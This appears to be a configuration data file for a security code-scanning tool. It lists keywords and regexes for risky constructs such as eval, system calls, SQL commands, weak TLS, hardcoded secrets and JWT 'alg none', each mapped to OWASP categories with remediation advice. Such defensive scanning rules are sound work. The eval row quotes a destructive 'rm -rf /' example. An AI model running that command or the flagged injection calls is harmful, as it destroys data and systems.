CategoryNo;CategoryName;CategoryType;Pattern;PatternName;Status;OutputFileName;IncludeComment;NotInternetFacing;IncludeIfSingleThread;Internal;Apply_BRs;Purpose;SearchOnlyFor;Classification;OWASP;Severity;Details;Remediation;Ref_1;Ref_2
10;General;;cert;cert;Investigate;General__Investigate_cert;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented?;;;
10;General;;sslv3;sslv3;Insecure;General__Insecure_sslv3;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;;;;
10;General;;sslv23;sslv23;Insecure;General__Insecure_sslv23;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;Uses best of sslv2, sslv3 and tlsv1.;;https://github.com/geminabox/geminabox/issues/169;
10;General;;"r""^(?!.*(soap|xmlns|namespace|www.w3.org)).*(://)""";external_parties;Investigate;General__Investigate_external_parties;False;;True;True;True;;;Transport security;A2-Cryptographic Failures;Informational;;;;
10;General;;socket;socket;Investigate;General__Investigate_socket;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;New Socket should be a secure socket.;Java, scala: use SSLSocketFactory to create a new Socket.;https://blog.codacy.com/9-scala-security-issues/#gs.Z2R6tHQ;
10;General;;"r""^(?!.*(soap|xmlns|namespace|www.w3.org)).*(http://)""";http;Investigate;General__Investigate_http;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;;;
10;General;;SSL_VERIFY_NONE;sslverifynone;Investigate;General__Investigate_sslverifynone;True;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection?;;;
10;General;;secure;secure;Investigate;General__Investigate_secure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Insecure connection? Cookie context only. Should be ""true"".";;;
10;General;;httponly;httponly;Investigate;General__Investigate_httponly;True;Exclude;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Insecure connection? Cookie context only. Should be ""true"".";;;
10;General;;fprint;fprint;Investigate;General__Investigate_fprint;False;;True;False;True;;;Buffer overflow;A3-Injection;High;User input not parameterized in a string is vulnerable.;;https://owasp.org/www-community/attacks/Format_string_attack;
10;General;;printf;printf;Investigate;General__Investigate_printf;False;;True;False;True;;;Buffer overflow;A3-Injection;High;User input not parameterized in a string is vulnerable.;;https://owasp.org/www-community/attacks/Format_string_attack;
10;General;;eval(;eval;Investigate;General__Investigate_eval;False;;True;False;True;;;Command  injection;A3-Injection;High;"Can it be used as user exit point? Bad example: eval(""os.system('rm -rf /') # dangerous!"")";;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
10;General;;system(;system;Investigate;General__Investigate_system;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it be used as user exit point?;;;
10;General;;new function(;new_function;Investigate;General__Investigate_new_function;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it be used as user exit point (does it create function based on user data)?;;;
10;General;;script;script;Investigate;General__Investigate_script;True;Exclude;True;False;True;Locate;;Injection;A3-Injection;High;Can the script be influenced by the user/attacker? EU court decides (2020-08) that sensitive data transfer to non-GDPR countries (like VS for it's surveillance program) is unwanted. This includes Google Analytics/Facebook Connect that e.g. gather IP-address, cookie data.;;;
10;General;;*CF_SCRIPT(HREF);href;Investigate;General__Investigate_href;True;Exclude;True;False;True;;;Injection;A3-Injection;High;Can the url be influenced by the user/attacker? ;;;
10;General;;SqlCommand;SqlCommand;Investigate;General__Investigate_SqlCommand;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;;
10;General;;.raw;raw;Investigate;General__Investigate_raw;False;;True;False;True;;;SQL Injection;A3-Injection;High;Raw (or Django rawsql) circumvents framework  proteection e.g. in Django or Ruby.;Escape querystring parameters and do not quote placeholders.;https://docs.djangoproject.com/en/4.1/topics/security;
10;General;; CREATE TABLE ;CREATE;Investigate;General__Investigate_CREATE;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;;
10;General;;upload;upload;Investigate;General__Investigate_upload;False;;True;False;True;Locate;;Malicious code;A3-Injection;High;For untrusted file uploads, is a virus scanner in place?;;;
10;General;;execute ;execute;Investigate;General__Investigate_execute;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input, e.g. via parameters.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;https://stackoverflow.com/questions/4339611/exploitable-java-functions
10;General;;save(;save;Investigate;General__Investigate_save;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
10;General;;.exec;execute_2;Investigate;General__Investigate_execute_2;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input may saved in the database, e.g. via parameters.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
10;General;;*CF_WHERE;WHERE;Investigate;General__Investigate_WHERE;True;;True;False;True;Locate;;Injection;A3-Injection;High;;;;
10;General;;url;url;Investigate;General__Investigate_url;False;Exclude;True;False;True;Locate;AssignedTo;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;request.;request;Investigate;General__Investigate_request;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;req.;req;Investigate;General__Investigate_req;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;rqs.;rqs;Investigate;General__Investigate_rqs;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;HttpRequest;httprequest;Investigate;General__Investigate_httprequest;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;e.g. django class, can be renamed to e.g. req;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;;
10;General;;x-xss-protection;xssprotection;Investigate;General__Investigate_xssprotection;False;Exclude;True;False;True;;;XSS;A3-Injection;Medium;xxs solution;;;
10;General;;*CF_REDOS;reDoS;Insecure;General__Insecure_reDoS;False;;True;False;True;;;ReDoS;A4-Insecure Design;High;In all server side regex implementations using backtracking NFA.;Use a better regex, without repeated group expressions with repetitions (like ^(\d+)*$). Or use another implementation (e.g. RE2) or set maximum computation time.;https://msdn.microsoft.com/en-us/magazine/ff646973.aspx;https://stackoverflow.com/questions/63127145/safe-regex-patterns-from-redos-attack
10;General;;lock;lock;Investigate;General__Investigate_lock;False;;False;False;True;Locate;;Denial of service;A4-Insecure Design;Medium;Only if attacker can lock;;;
10;General;;"input type=""hidden""";input_type_hidden;Investigate;General__Investigate_input_type_hidden;False;Exclude;True;False;True;Locate;;Insecure design;A4-Insecure Design;Medium;"No secret info , no application state or js calculation (source code can be viewed/changed); should be done server side.";;https://stackoverflow.com/questions/25206173/hidden-field-vulnerability;
10;General;; temp;temp;Investigate;General__Investigate_temp;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;HACK;HACK;Investigate;General__Investigate_HACK;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;todo;todo;Investigate;General__Investigate_todo;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;; fix ;fix;Investigate;General__Investigate_fix;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;fixme;fixme;Investigate;General__Investigate_fixme;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;"r""^(?!.*://).*(//)""";doubleslash;Verify_FP;General__Verify_FP_doubleslash;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context, comment;;;
10;General;;security;security;Investigate;General__Investigate_security;False;;True;False;True;Locate;;Security misconfiguration;A5-Security Misconfiguration;Low;Only in temp dir context;;;
10;General;;header;header;Investigate;General__Investigate_header;False;Exclude;True;False;True;;AssignedTo;Security misconfiguration;A5-Security Misconfiguration;Medium;Are expected headers present?;"Add headers like 'X-Content-Type-Options(nosniff)', Content-Security-Policy(default-src https://cdn.example.net; child-src 'none'; object-src 'none')', 'Strict-Transport-Security(max-age=31536000'), 'X-Frame-Options(sameorigin)'";https://owasp.org/www-project-secure-headers/;https://web.dev/csp/
10;General;;*CF_RESOURCES;resources;Investigate;General__Investigate_resources;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS resources using wildcard;;;
10;General;;*CF_ACTIONS;actions;Investigate;General__Investigate_actions;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS actions using wildcard;;;
10;General;;*CF_PRINCIPALS;principals;Investigate;General__Investigate_principals;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS principals using wildcard;;;
10;General;;redirect;redirect;Investigate;General__Investigate_redirect;False;Exclude;True;False;True;;;Phishing;A5-Security Misconfiguration;Medium;"Untrusted URL input. Phishing. Safe: e.g. Response.Redirect(""https.mysite.com""). Unsafe: redirect_url = $_GET[""url""]; (PHP)";;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
10;General;;obsolete;obsolete;Investigate;General__Investigate_obsolete;True;;True;False;True;;;Insecure design;A6-Vulnerable and Outdated Components;Low;Only in security context;;;
10;General;;depricated;depricated;Investigate;General__Investigate_depricated;True;;True;False;True;;;Insecure design;A6-Vulnerable and Outdated Components;Low;Only in security context;;;
10;General;;authenticat;authenticat;Investigate;General__Investigate_authenticat;False;;True;False;True;Locate;;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;credential;credential;Investigate;General__Investigate_credential;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pass;pass;Investigate;General__Investigate_pass;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pwd;pwd;Investigate;General__Investigate_pwd;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pincode;pincode;Investigate;General__Investigate_pincode;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;private_key;private_key;Investigate;General__Investigate_private_key;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;token;token;Investigate;General__Investigate_token;False;;True;False;True;Locate;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;expir;expir;Investigate;General__Investigate_expir;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Token should expire within say 1 hour.;;https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html;
10;General;;admin ;admin;Investigate;General__Investigate_admin;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;*CF_HARDCODED_KEY(30);hardcoded_key;Investigate;General__Investigate_hardcoded_key;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Secrets should be kept secret;Ensure secrets are stored in an environment dependent configuration file or system parameter.;;
10;General;; otp;otp;Investigate;General__Investigate_otp;False;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;One Time Password;;;
10;General;;forTrust;forTrust;Investigate;General__Investigate_forTrust;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;ObjC/Swift certificate pinning turned off;;;
10;General;;allowInvalidCertificate;allowInvalidCertificate;Investigate;General__Investigate_allowInvalidCertificate;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Server network level certificate check turned off (AFNetworking class);;;
10;General;;"r""{[ \""]+alg[ \""]+:[ \""]+none[ \""]+}""";algnone;Investigate;General__Investigate_algnone;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;JWT unsecured token;"Do not use {""alg"":""none""}";https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html;
10;General;;*CF_EMAIL;email;Investigate;General__Investigate_email;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Low;Privacy violation, email spoofing?;;;
10;General;;cookie;cookie;Investigate;General__Investigate_cookie;False;Exclude;True;False;True;Locate;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;;;;
10;General;;login;login;Investigate;General__Investigate_login;False;;True;False;True;Locate;AssignedTo;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;;;;
10;General;;ldap;ldap;Investigate;General__Investigate_ldap;False;;True;False;True;Locate;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;LDAP-injection;;https://www.owasp.org/index.php/LDAP_injection;
10;General;; bsn;bsn;Investigate;General__Investigate_bsn;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;; ssn;ssn;Investigate;General__Investigate_ssn;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;bankaccount;bankaccount;Investigate;General__Investigate_bankaccount;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;creditcard;creditcard;Investigate;General__Investigate_creditcard;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;*CF_PHONE;phone;Investigate;General__Investigate_phone;False;;True;False;True;;AssignedTo;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;secret;secret;Investigate;General__Investigate_secret;True;;True;False;True;;AssignedTo;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Secrets should be kept secret;Ensure secrets are stored in an environment dependent configuration file or system parameter.;;
10;General;;debug;debug;Investigate;General__Investigate_debug;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;dump;dump;Investigate;General__Investigate_dump;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;*CF_TRACE;trace;Investigate;General__Investigate_trace;True;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;*CF_LOG;log;Investigate;General__Investigate_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_LOGGER;logger;Investigate;General__Investigate_logger;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_PRINT;print;Investigate;General__Investigate_print;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_AUTOESCAPE(contains, or, false, none);autoescape;Investigate;General__Investigate_autoescape;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Turnes off  escaping mechanism used in framework.;Use the default autoescape=true.;;
10;General;;csrf;csrf;Investigate;General__Investigate_csrf;False;Exclude;True;False;True;Locate;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;csrf solution;;https://spring.io/blog/2015/10/28/react-js-and-spring-data-rest-part-5-security;
10;General;;Storage.setItem;storageSetitem;Investigate;General__Investigate_storageSetitem;False;;True;False;True;;;Sensitive data exposure;A5-Security Misconfiguration;High;Frontend (JS, TS, Vue). Local and - less easily- Sessionstorage can be read by an attacker.;Encrypt sensitive data. E.g. Using npm encrypt-storage.;https://blog.bitsrc.io/sessionstorage-and-localstorage-a-ux-security-comparison-a05c486413e0;
20;Language;NET;ActionInput;ActionInput;Investigate;Language_NET_Investigate_ActionInput;False;;True;False;True;;;Input validation;A3-Injection;High;Elsa syntax;;;
20;Language;NET;AllowHtml;AllowHtml;Investigate;Language_NET_Investigate_AllowHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;;Validate and/or sanitize.;;
20;Language;NET;[From;from_uri;Investigate;Language_NET_Investigate_from_uri;False;;True;False;True;;;Open redirect;A1-Broken Access Control;Medium;[FromUri]  in ASP 2.0 and [FromRoute] or [FromQuery] in ASP Core are used to retrieve uri values;Validate and/or sanitize.;;
20;Language;NET;HashPasswordForStoringInConfigFile;HashPasswordForStoringInConfigFile;Insecure;Language_NET_Insecure_HashPasswordForStoringInConfigFile;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Insecure cryptography;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;Rnd(;rnd;Insecure;Language_NET_Insecure_rnd;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
20;Language;NET;FromBase64String(;FromBase64String;Insecure;Language_NET_Insecure_FromBase64String;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
20;Language;NET;FormsAuthentication.SignOut;FormsAuthentication_SignOut;Insecure;Language_NET_Insecure_FormsAuthentication_SignOut;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Session hijacking. Cookie removed from client only, not from server.;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;HttpCookie(;HttpCookie;Investigate;Language_NET_Investigate_HttpCookie;False;Exclude;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection? Cookie context only.;;;
20;Language;NET;.Expires =;Expires;Investigate;Language_NET_Investigate_Expires;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection? Cookie context only.;;;
20;Language;NET;ProcessStartInfo;ProcessStartInfo;Insecure;Language_NET_Insecure_ProcessStartInfo;False;;True;False;True;;;SQL injection;A3-Injection;High;Cmd/Batch file passed as parameter;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;ExecuteReader(;ExecuteReader;Investigate;Language_NET_Investigate_ExecuteReader;False;;True;False;True;;;SQL injection;A3-Injection;High;Executes SqlCommand;Parameterized queries;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;.exe;exe;Investigate;Language_NET_Investigate_exe;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;Shell;Shell;Insecure;Language_NET_Insecure_Shell;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;shell_exec(;shellexec;Insecure;Language_NET_Insecure_shellexec;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;File.delete(;filedelete;Investigate;Language_NET_Investigate_filedelete;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;DeleteFile(;deletefile;Investigate;Language_NET_Investigate_deletefile;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;SqlDataAdapter(;sqldataadapter;Investigate;Language_NET_Investigate_sqldataadapter;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;Response.Write;Response_Write;Investigate;Language_NET_Investigate_Response_Write;False;;True;False;True;;;Output encoding;A3-Injection;Medium;Malicious code from server inserted in HTML tag. ;Output sanitization: Encode HTML;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;<%=;Response_Write2;Investigate;Language_NET_Investigate_Response_Write2;False;;True;False;True;;;Output encoding;A3-Injection;Medium;Malicious code from server inserted in HTML tag. ;Use <%:, this encodes HTML.;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;ReadFile(;ReadFile;Investigate;Language_NET_Investigate_ReadFile;False;;True;False;True;;;DoS;A4-Insecure Design;Medium;;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
30;Language;NET;XpathNavigator;xpathnavigator;Investigate;Language_NET_Investigate_xpathnavigator;False;;True;False;True;Locate;;XXE;A5-Security Misconfiguration;Medium;;Use XmlReader, not XMLDocument. Generally, disable DTD (External Entities). ;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
20;Language;NET;.LoadXml(;loadxml;Investigate;Language_NET_Investigate_loadxml;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;Never load untrusted XML content into a .NET XmlDocument class as a first step.;"xmlDoc.XmlResolver = null; /* disables DTDs, was vulnerability prior to .NET 4.5.2 */. Use XmlReader with settings like MaxCharactersInDocument";https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;https://blogs.msdn.microsoft.com/tomholl/2009/05/21/protecting-against-xml-entity-expansion-attacks/
20;Language;NET;XmlDocument;xmldocument;Investigate;Language_NET_Investigate_xmldocument;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;XmlDocument is unsafe.;Use XmlReader instead.;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
20;Language;NET;is_wctype;is_wctype;Insecure;Language_NET_Insecure_is_wctype;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_loaddll;_loaddll;Insecure;Language_NET_Insecure__loaddll;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
